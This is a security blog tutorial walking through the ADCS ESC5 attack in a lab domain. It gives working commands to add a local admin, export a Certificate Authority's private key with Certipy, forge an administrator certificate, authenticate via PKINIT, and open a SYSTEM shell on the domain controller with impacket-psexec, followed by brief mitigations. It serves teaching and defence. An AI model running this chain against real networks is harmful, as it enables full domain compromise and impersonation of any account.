<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
            <h1 class="post-title entry-title">ADCS ESC5: Vulnerable PKI Object Access Control</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ad-cs-esc5-vulnerable-pki-object-access-control/" rel="bookmark"><time class="entry-date published" datetime="2025-05-11T15:31:15+00:00">May 11, 2025</time><time class="updated" datetime="2025-06-19T13:22:58+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000"><strong>ESC5</strong> is a high-risk <strong>certificate attack</strong> targeting <strong>Active Directory Certificate Services (ADCS)</strong>. This <strong>ADCS</strong> <strong>attack</strong> exploits insecure access to the <strong>Certificate Authority (CA)</strong>’s private key. When attackers gain local admin access on the CA server, they can export the private key. This allows them to forge valid certificates for any AD account, including Domain Admins. This certificate attack allows adversaries to authenticate via Kerberos PKINIT, enabling lateral movement across the network without needing passwords or hashes. The <strong>ESC5 ADCS</strong> attack highlights the importance of securing the CA private key to prevent this severe vulnerability.</span></p>
<h3><span style="color: #800000">Table of Content</span></h3>
<ul>
<li><span style="color: #000000"><strong>Overview the ESC5 Attack</strong></span></li>
<li><span style="color: #000000"><strong>ESC5 Attack Mechanism</strong></span></li>
<li><span style="color: #000000"><strong>Vulnerable PKI Object Access Control Structure</strong></span></li>
<li><span style="color: #000000"><strong>Prerequisites</strong></span></li>
</ul>
<p><span style="color: #000000"><strong>Enumeration and exploitation</strong></span></p>
<ul>
<li><span style="color: #000000">Add/Verify Local Admin Access on the CA Server</span></li>
<li><span style="color: #000000">ESC5 Attack Using Certipy</span></li>
</ul>
<p><span style="color: #000000"><strong>Post Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></li>
</ul>
<p><span style="color: #000000"><strong>Mitigation </strong></span></p>
<h3><span style="color: #800000">Overview of the ESC5 Attack</span></h3>
<p><span style="color: #000000"><strong>ESC5</strong> is an attack against <strong>Active Directory Certificate Services (ADCS)</strong> where an attacker with <strong>local admin access on the CA server</strong> extracts the <strong>CA’s private key</strong>. With it, they can forge certificates for any user (including <strong>Domain Admins</strong>). This allows them to authenticate via <strong>Kerberos PKINIT</strong>, gaining full domain access without needing passwords or<strong> hashes</strong>.</span></p>
<p><span style="color: #000000">It’s stealthy, powerful, and exploits trust in the CA’s signing key by leveraging the inherent trust Active Directory places in the Certificate Authority’s (CA) signing key.</span></p>
<p><span style="color: #000000">Here are the key requirements that make ESC5 possible:</span></p>
<ul>
<li><span style="color: #000000"><strong>Local Admin Access on the CA Server</strong> → The attacker needs local admin rights on the CA server to extract the private key.</span></li>
<li><span style="color: #000000"><strong>Unprotected CA Private Key</strong> → The CA’s private key must be poorly protected, allowing attackers to steal it.</span></li>
<li><span style="color: #000000"><strong>No Certificate Revocation or Long Validity</strong> → If certificates are issued with long validity and no revocation, attackers can maintain persistent access.</span></li>
<li><span style="color: #000000"><strong>Trust in CA’s Signed Certificates</strong> → Active Directory trusts any certificate signed by the CA, enabling attackers to forge valid certificates for any AD account, including Domain Admins.</span></li>
</ul>
<h3><span style="color: #800000">ESC5 Attack Mechanism</span></h3>
<ul>
<li><span style="color: #000000"><strong>Compromise Local Admin Access on CA Server</strong> → The attacker gains local admin privileges on the Certificate Authority server, often through lateral movement or misconfigured groups.</span></li>
<li><span style="color: #000000"><strong>Export the CA’s Certificate and Private Key </strong>→ Using tools like Certipy-AD, the attacker exports the CA’s certificate and private key into a .pfx file.</span></li>
<li><span style="color: #000000"><strong>Forge a Certificate for a Privileged User</strong> → With the private key, the attacker forges a certificate for a privileged user (e.g., admininstrator@ignite.local), which is accepted by Active Directory.</span></li>
<li><span style="color: #000000"><strong>Authenticate with the Forged Certificate (PKINIT)</strong> → The attacker uses the forged certificate to authenticate via Kerberos PKINIT, impersonating the target and obtaining a TGT.</span></li>
<li><span style="color: #000000"><strong>Lateral Movement and Domain Control</strong> → Using the TGT, the attacker escalates privileges and moves laterally across the network, often reaching Domain Admin access.</span></li>
</ul>
<h3><span style="color: #800000">Vulnerable PKI Object Access Control Structure</span></h3>
<p><span style="color: #000000">The success of an ESC5 attack depends on specific weaknesses in the PKI setup:</span></p>
<ul>
<li><span style="color: #000000"><strong>CA Server Permissions </strong>→ <strong>If local admin access is possible, the attacker can extract the CA’s private key.</strong></span></li>
<li><span style="color: #000000"><strong>Private Key Protection </strong>→ <strong>Weak protections (or none at all) on the CA key allow unauthorized export and misuse.</strong></span></li>
<li><span style="color: #000000"><strong>AD Trust Model </strong>→<strong> AD inherently trusts certificates issued by the CA— even if they were forged.</strong></span></li>
<li><span style="color: #000000"><strong>Kerberos with PKINIT </strong>→ <strong>Allows login using certificates, enabling silent impersonation of privileged users. </strong></span></li>
</ul>
<p><span style="color: #000000"><em>Note: These misconfigurations enable a local admin on the CA server to bypass Active Directory permissions, allowing them to impersonate any user in the domain instantly.</em></span></p>
<h3><span style="color: #800000">Prerequisite </span></h3>
<ul>
<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
<li><span style="color: #000000">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
<li><span style="color: #000000">Kali Linux is packed with tools</span></li>
<li><span style="color: #000000">Tools: Impacket-psexec, certipy-ad</span></li>
</ul>
<p><span style="color: #000000">If you’re reading this, we assume you’re already familiar with ADCS attack paths and lab deployment. You likely know how to:</span></p>
<ul>
<li><span style="color: #000000">Enumerate certificate templates using tools like Certipy or Metasploit</span></li>
<li><span style="color: #000000">Understand the significance of template settings such as ENROLLEE_SUPPLIES_SUBJECT and Client Authentication</span></li>
<li><span style="color: #000000">Navigate the structure and hierarchy of CAs and templates within Active Directory</span></li>
</ul>
<p><span style="color: #000000">Instead of revisiting lab setup, this post dives directly into exploiting a high-impact misconfiguration the ESC5 attack path. Unlike attacks that target template permissions</span> – <span style="color: #0000ff"><a style="color: #0000ff" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/"><strong>ESC4</strong></a>,</span> <span style="color: #000000">ESC5 focuses on exploiting insecure access to the CA’s private key.</span></p>
<h3><span style="color: #800000">Enumeration &amp; Exploitation</span></h3>
<h4><span style="color: #000000">Add/Verify Local Admin Access on the CA Server</span></h4>
<p><span style="color: #000000">To access the CA’s private key, we need local admin rights on the CA server. This allows us to interact with the CA service, request backups, or inspect certificate stores.</span></p>
<p><span style="color: #000000">A common misconfiguration is improperly adding users to the local Administrators group.</span></p>
<p><span style="color: #000000">Use these commands to check or add a user like “raj”:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net localgroup Administrators "igniteraj" /add
net localgroup Administrators</pre>
<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMV-v0sGYScijB_ucpvnlNgEQhNRZNGF9nuZXfHcO6hdBqIK6OMgbyM3mxLP1z_dBKv6jee5i_R5O5OXmLzxj8vx9E1QAFt4xAkwzLa_KK0CRJUxCcTpXtnTwpmSsIo6ZvQsexsTMeg-vkdvnHgxDd_JRg1iyj9IiYiT0tzeD3fpu2LByIsRxfFgxpUYW/s16000/1.png" alt="ADCS ESC5 Vulnerable PKI Object Access Control" width="848" height="424"/></p>
<p><span style="color: #000000">Verify if “raj” is in the Administrators group; it could grant unauthorized access to the CA server, facilitating an ESC5 attack.</span></p>
<h4><span style="color: #000000">ESC5 Attack Using Certipy</span></h4>
<p><span style="color: #000000">Let’s start with backing up the CA certificate and private key. The CA’s private key is critical for digitally signing issued certificates. If we gain access to it, we can forge certificates for any user or machine, and Active Directory will trust them.</span></p>
<p><span style="color: #000000">To back up the CA certificate and private key, run the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad ca -backup -u raj@ignite.local -p Password@1 -ca ignite-DC-CA -target 192.168.1.48</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVQugSei5EtXWHoRtq68TRnnSjdcgUOcKEFaz-n43AQ2NdYFzk1ZvKNgkQbsoq_NdMXjs_M8nSlUnCdrONwGUsydaCt5LLXE87nSahviUUvPJp_S8pHygnhGiYffL6TVg1BaDBkQc9nJv8gJGzxtOsBJ0VbhJz7_HHnG-M13i17xezG0Vk0i9vyCFKJcGI/s16000/2.png"/></p>
<p><span style="color: #000000">This command exports the CA certificate and private key into a file named ignite-DC-CA.pfx.</span></p>
<p><span style="color: #000000">With access to the CA’s private key, we can forge certificates for any UPN (e.g., administrator@ignite.local), effectively bypassing Active Directory’s permission controls.</span></p>
<p><span style="color: #000000">Using the private key, we can run the following command to forge a certificate for a specific user:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad forge -ca-pfx 'ignite-DC-CA.pfx' -upn administrator@ignite.local</pre>
<p><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0j9vRD3u3U2bX-qcclZfpbjmTwfmY9vgZz-QkdrXIK9OnxJQhV0vLDSxwQrMfOuo9PUU2hLONMWn4rK3EmX4mEEYbe9z0WHrKpmkZntFZKY-kRHd7EiDcnfnMAGGz4HhR-ZAgntu7BVYV3zbJNKu7ryERTlhs2naJ0VO1e2HnBYPYmlYFfhYmUEKRBpX7/s16000/3.png" alt="ADCS ESC5 Vulnerable PKI Object Access Control" width="853" height="133"/></p>
<p><span style="color: #000000">This creates a valid, signed certificate (administrator_forged.pfx), allowing us to impersonate the targeted user, such as a Domain Admin, and gain unauthorized access to resources.</span></p>
<p><span style="color: #000000">AD supports PKINIT, which enables Kerberos authentication using certificates. With the forged certificate, we can request a TGT as administrator@ignite.local, gaining access to domain resources.</span></p>
<h5><span style="color: #000000">Run the Auth Command to achieve:</span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator_forged.pfx -dc-ip 192.168.1.48</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOxtjHSPYeRm34U57QdFUyCAMgW1_lXPQn_MKJesiaMpUPWpwkzmXy4EFPjWe9ntIEoDFnQhEpNLSzUJw1RUGRg0MGFdlVCyfzDdw7rbTg5oasrnRLmTyElMVOEqrvtfAWax857tGVaT3YlkUd37WT09O5glGCiwvmXexLeC8hQyevtkFidY_0tfFQrSsG/s16000/4.png"/></p>
<p><span style="color: #000000">This command dumps the NTLM hashes in the session, allowing us to authenticate as the targeted user.</span></p>
<h3><span style="color: #800000">Post Exploitation</span></h3>
<h4><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></h4>
<p><span style="color: #000000">With Domain Admin access, use Impacket’s psexec to spawn a SYSTEM shell on remote machines via SMB.</span></p>
<p><span style="color: #000000">Run the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec ignite.local/administrator@ignite.local -hashes :32196b56ffe6f45e294117b91a83bf38</pre>
<p><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4rf4GEpdV1-cTRazjH1owNE9hEQluJd0f_kXVgg5Mh4GmLtxsDz0opaAWh46yTGMzTDWvBtO-XmoaF-1OHbkIc42WOqLAJGl8uWwi1b_SetNPhmskrm5vj2iC460i2GAsoCNNr1_M3zzwxh9VxiulVPHOJAgl8oigftXa9bre_yG5tMEyFTfPfhyphenhyphentO6d8/s16000/5.png" alt="ADCS ESC5 Vulnerable PKI Object Access Control" width="1081" height="324"/></p>
<p><span style="color: #000000">We gain Domain Admin access by backing up the CA’s private key through local admin rights on the CA server. We then forge a certificate for administrator@example.local, authenticate using <strong>PKINIT</strong>, and request a TGT.</span></p>
<p><span style="color: #000000">Using Impacket, we successfully obtained a SYSTEM shell on the Domain Controller, confirming full domain compromise.</span></p>
<h3><span style="color: #800000">Mitigation</span></h3>
<ul>
<li><span style="color: #000000"><strong>CA Access </strong>→ Remove unnecessary local admins from CA servers</span></li>
<li><span style="color: #000000"><strong>Template </strong>→ Security Disable ENROLLEE_SUPPLIES_SUBJECT &amp; unnecessary EKUs</span></li>
<li><span style="color: #000000"><strong>Auditing </strong>→ Use Certipy &amp; ADCSaudit regularly</span></li>
<li><span style="color: #000000"><strong>Monitoring </strong>→ Watch for certificate logons &amp; SAN-based auth anomalies</span></li>
</ul>
<p><span style="color: #000000"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact</span> <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" title="ADCS ESC4: Vulnerable Certificate Template Access Control">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC4: Vulnerable Certificate Template Access Control</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc7-vulnerable-certificate-authority-access-control/" title="ADCS ESC7 – Vulnerable Certificate Authority Access Control">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC7 – Vulnerable Certificate Authority Access Control</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/" rel="prev">ADCS ESC4: Vulnerable Certificate Template Access Control</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/esc6-editf_attributesubjectaltname2/" rel="next">ADCS ESC6: Editf_attributesubjectaltname2</a></div></div>
	</nav>        </div>
